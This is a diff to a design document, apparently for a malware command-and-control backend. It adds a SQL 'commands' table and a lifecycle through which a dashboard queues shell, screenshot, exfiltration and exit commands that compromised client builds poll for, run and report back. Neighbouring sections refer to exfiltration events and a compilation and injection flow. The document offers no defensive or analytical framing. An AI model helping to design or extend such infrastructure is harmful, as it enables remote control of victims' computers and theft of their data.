@@ -105,6 +105,30 @@ CREATE TABLE exfil_events (
 CREATE INDEX idx_exfil_build ON exfil_events (buildId, type);
 ```
 
+### 5. `commands`
+Remote command queue for the client's poll loop. A single atomic
+`UPDATE ... WHERE status='pending'` claims a command (poll-then-update would
+double-deliver under concurrency).
+```sql
+CREATE TABLE commands (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    buildId TEXT NOT NULL,            -- owning build directory under server/uploads/
+    type TEXT NOT NULL,               -- 'shell' | 'screenshot' | 'exfil' | 'exit'
+    args TEXT NOT NULL DEFAULT '',    -- shell command line, else ''
+    status TEXT NOT NULL DEFAULT 'pending', -- 'pending' | 'running' | 'done' | 'failed'
+    result TEXT,                      -- stdout(+stderr) / result message, capped at 60 KB
+    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
+    completedAt DATETIME
+);
+CREATE INDEX idx_cmd_build ON commands (buildId, id);
+```
+
+Command lifecycle: dashboard `POST /api/commands/:uuid` inserts a `pending`
+row → client `GET /cmd/poll` atomically flips it to `running` and returns it →
+client executes → `POST /cmd/result` verifies `command.buildId === authenticated
+build` then marks `done`/`failed` with the result. `/api/logs` attaches the
+build's last 20 commands to each log payload.
+
 ---
 
 ## Compilation & Injection Flow
